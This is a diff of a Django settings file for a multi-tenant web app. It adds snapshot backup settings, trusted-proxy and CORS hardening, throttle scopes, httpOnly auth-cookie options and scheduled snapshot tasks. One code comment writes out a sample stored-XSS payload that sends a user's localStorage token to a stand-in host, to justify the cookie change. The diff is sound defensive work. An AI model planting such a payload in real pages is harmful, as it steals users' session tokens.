@@ -71,6 +71,7 @@ SHARED_APPS = [
 
     'core',
     'superadmin',
+    'snapshots',
 ]
 
 # Phase 2: Add django-celery-beat when installed (pip install django-celery-beat)
@@ -262,6 +263,21 @@ STATICFILES_FINDERS = [
 MEDIA_URL = 'media/'
 MEDIA_ROOT = BASE_DIR / 'media'
 
+# ── In-app snapshots (Phase 1) ─────────────────────────────────────
+SNAPSHOTS_BACKUP_DIR           = os.getenv(
+    'SNAPSHOTS_BACKUP_DIR', str(BASE_DIR / 'snapshots_storage'))
+SNAPSHOTS_RETENTION_DAYS       = int(os.getenv('SNAPSHOTS_RETENTION_DAYS', '14'))
+SNAPSHOTS_MAX_PER_TENANT       = int(os.getenv('SNAPSHOTS_MAX_PER_TENANT', '5'))
+SNAPSHOTS_KEK_HEX              = os.getenv('SNAPSHOTS_KEK_HEX')
+SNAPSHOTS_KEK_ID               = os.getenv('SNAPSHOTS_KEK_ID', 'kek-v1')
+SNAPSHOTS_CREATE_RATE_PER_HOUR   = int(os.getenv('SNAPSHOTS_CREATE_RATE_PER_HOUR', '5'))
+SNAPSHOTS_DOWNLOAD_RATE_PER_HOUR = int(os.getenv('SNAPSHOTS_DOWNLOAD_RATE_PER_HOUR', '10'))
+SNAPSHOTS_PG_DUMP_BIN          = os.getenv('SNAPSHOTS_PG_DUMP_BIN', 'pg_dump')
+SNAPSHOTS_MAX_BUFFER_GB        = int(os.getenv('SNAPSHOTS_MAX_BUFFER_GB', '8'))
+SNAPSHOTS_SOFT_TIME_LIMIT_SEC  = int(os.getenv('SNAPSHOTS_SOFT_TIME_LIMIT_SEC', '3000'))
+SNAPSHOTS_HARD_TIME_LIMIT_SEC  = int(os.getenv('SNAPSHOTS_HARD_TIME_LIMIT_SEC', '3600'))
+SNAPSHOTS_REAPER_BUFFER_SEC    = int(os.getenv('SNAPSHOTS_REAPER_BUFFER_SEC', '300'))
+
 # For production with Redis, use:
 # CACHES = {
 #     'default': {
@@ -296,6 +312,15 @@ CORS_ALLOWED_ORIGINS = os.getenv(
     'CORS_ALLOWED_ORIGINS',
     'http://localhost:5173,http://127.0.0.1:5173,http://localhost:3000'
 ).split(',')
+
+# IPs / CIDRs of reverse proxies whose X-Forwarded-For headers we trust.
+# Anything outside this list is treated as an untrusted client and
+# X-Forwarded-For from it is ignored — REMOTE_ADDR is used instead.
+TRUSTED_PROXY_IPS = [
+    cidr.strip() for cidr in os.getenv(
+        'TRUSTED_PROXY_IPS', '127.0.0.1,::1',
+    ).split(',') if cidr.strip()
+]
 # Regex auto-allow for tenant subdomains. With subdomain-based tenancy
 # every tenant lives at ``<slug>.<TENANT_SUBDOMAIN_BASE>``, so a regex
 # is the cleanest way to whitelist the entire tenant fleet without
@@ -309,7 +334,11 @@ CORS_ALLOWED_ORIGIN_REGEXES = [
     # Plain http variant for dev / staging when TLS isn't terminated.
     rf'^http://[a-z0-9]([a-z0-9-]{{0,28}}[a-z0-9])?\.{_tenant_base_escaped}$',
 ]
-CORS_ALLOW_ALL_ORIGINS = DEBUG  # Allow all origins in development only
+# SECURITY: Never globally allow all origins — even in DEBUG. The
+# explicit CORS_ALLOWED_ORIGINS list above (plus the tenant-subdomain
+# regex) already covers local dev (localhost:5173, :3000, 127.0.0.1)
+# and production tenant subdomains.
+CORS_ALLOW_ALL_ORIGINS = False
 # Credentials must be enabled in BOTH environments — token-authenticated axios
 # requests are treated as "credentialed" by browsers, and disabling this flag
 # causes cross-origin requests to fail in production. Security is enforced via
@@ -352,6 +381,11 @@ REST_FRAMEWORK = {
     'DEFAULT_AUTHENTICATION_CLASSES': [
         'core.authentication.ExpiringTokenAuthentication',
     ],
+    # Domain-exception → HTTP translator. Handles SoDViolation today
+    # (raised by service-layer SoD enforcement on PR approve, PO
+    # approve, PV mark-paid, JV post); add more cases in
+    # core.drf_exception_handler as new domain exceptions emerge.
+    'EXCEPTION_HANDLER': 'core.drf_exception_handler.project_exception_handler',
     'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination',
     'PAGE_SIZE': 20,
     'DEFAULT_THROTTLE_CLASSES': [
@@ -388,6 +422,15 @@ REST_FRAMEWORK = {
         'bulk_import':  '10/hour',
         # Approval actions — prevent approval-click spam.
         'approve':      '120/hour',
+        # G-A4 — heavy READ endpoints. IPSAS/statutory reports and file
+        # exports each fan out several aggregates; these scopes stop one
+        # user monopolising report/export capacity under load without
+        # touching normal CRUD. Generous + env-overridable so a busy
+        # treasury day (or the test suite) can raise the ceiling.
+        'reports':      os.getenv('REPORTS_THROTTLE_RATE', '600/hour'),
+        'exports':      os.getenv('EXPORTS_THROTTLE_RATE', '300/hour'),
+        'snapshot_create':    f'{SNAPSHOTS_CREATE_RATE_PER_HOUR}/hour',
+        'snapshot_download':  f'{SNAPSHOTS_DOWNLOAD_RATE_PER_HOUR}/hour',
     },
     'DEFAULT_VERSION': 'v1',
     'VERSION_PARAM': 'version',
@@ -453,6 +496,66 @@ SPECTACULAR_SETTINGS = {
 
 # Token expiration (in hours)
 TOKEN_EXPIRATION_HOURS = int(os.getenv('TOKEN_EXPIRATION_HOURS', '24'))
+
+
+# =============================================================================
+# AUTH COOKIE (httpOnly cookie auth path — see core.authentication +
+# core.views.auth)
+# =============================================================================
+#
+# Why this exists
+# ---------------
+# The legacy auth flow stores the API token in ``localStorage`` and the
+# frontend injects ``Authorization: Token <key>`` on every request. That
+# pattern is vulnerable to any stored-XSS injection — a single
+# ``document.body.innerHTML += '<img src=x onerror="fetch(EVIL, {
+# body: localStorage.authToken })">'`` would exfiltrate every active
+# user's token.
+#
+# The cookie path issues the same token as an ``httpOnly`` cookie:
+# JavaScript can't read it (closing the XSS exfil vector) while the
+# browser still sends it on every API call. ``CORS_ALLOW_CREDENTIALS``
+# is already True so this works cross-origin.
+#
+# Safe rollout
+# ------------
+# ``AUTH_COOKIE_ENABLED`` defaults to False so this ships dormant.
+# Flip it per-deployment via env var. The ``ExpiringTokenAuthentication``
+# class accepts EITHER the header OR the cookie regardless of this
+# flag, so a tenant can move users to cookies one wave at a time
+# without breaking the rest.
+AUTH_COOKIE_ENABLED  = os.getenv('AUTH_COOKIE_ENABLED', 'False').lower() == 'true'
+AUTH_COOKIE_NAME     = os.getenv('AUTH_COOKIE_NAME', 'auth_token')
+# Production: Secure=True (cookie only over HTTPS). DEBUG defaults to
+# not-secure so local http://localhost works.
+AUTH_COOKIE_SECURE   = os.getenv('AUTH_COOKIE_SECURE', str(not DEBUG)).lower() == 'true'
+# 'Lax' is the right balance: blocks CSRF from third-party sites while
+# allowing the cookie on top-level navigation (so a deep-link from
+# email still authenticates). 'Strict' would block legitimate flows;
+# 'None' weakens CSRF defence and requires HTTPS.
+AUTH_COOKIE_SAMESITE = os.getenv('AUTH_COOKIE_SAMESITE', 'Lax')
+# Empty string → cookie scoped to the request host (right for
+# subdomain-per-tenant setups). Set to e.g. '.example.com' for
+# cross-subdomain access.
+AUTH_COOKIE_DOMAIN   = os.getenv('AUTH_COOKIE_DOMAIN', '') or None
+# Path defaults to '/' so the cookie travels with every API request.
+AUTH_COOKIE_PATH     = os.getenv('AUTH_COOKIE_PATH', '/')
+# AUTH_COOKIE_ONLY — when True the login response OMITS the token from
+# the JSON body, forcing the browser to rely solely on the httpOnly
+# cookie. Defaults to False so that during the migration window the
+# legacy clients (mobile, scripts, current frontend builds) keep
+# working. Flip per-tenant only AFTER ``AUTH_COOKIE_ENABLED`` has been
+# verified for that deployment. Cookie itself is still emitted whenever
+# AUTH_COOKIE_ENABLED is True regardless of this flag.
+AUTH_COOKIE_ONLY     = os.getenv('AUTH_COOKIE_ONLY', 'False').lower() == 'true'
+# AUTH_COOKIE_MAX_AGE — explicit cookie lifetime (seconds). Defaults to
+# TOKEN_EXPIRATION_HOURS so the browser drops the cookie at the same
+# moment the server-side token would be rejected. Override only if you
+# need a shorter UX session window than the token TTL.
+AUTH_COOKIE_MAX_AGE  = int(os.getenv(
+    'AUTH_COOKIE_MAX_AGE',
+    str(TOKEN_EXPIRATION_HOURS * 3600),
+))
 
 # =============================================================================
 # JWT SETTINGS
@@ -809,6 +912,15 @@ CELERY_BEAT_SCHEDULE = {
     'hrm-non-compliant-report': {
         'task': 'hrm.non_compliant_report',
         'schedule': 604800,  # Weekly
+    },
+    # Snapshots — retention enforcement + stale-job reaper
+    'snapshots-enforce-retention': {
+        'task': 'snapshots.enforce_retention_all',
+        'schedule': 86400,  # Daily
+    },
+    'snapshots-reap-stale-jobs': {
+        'task': 'snapshots.reap_stale_jobs',
+        'schedule': 3600,   # Hourly
     },
 }
 
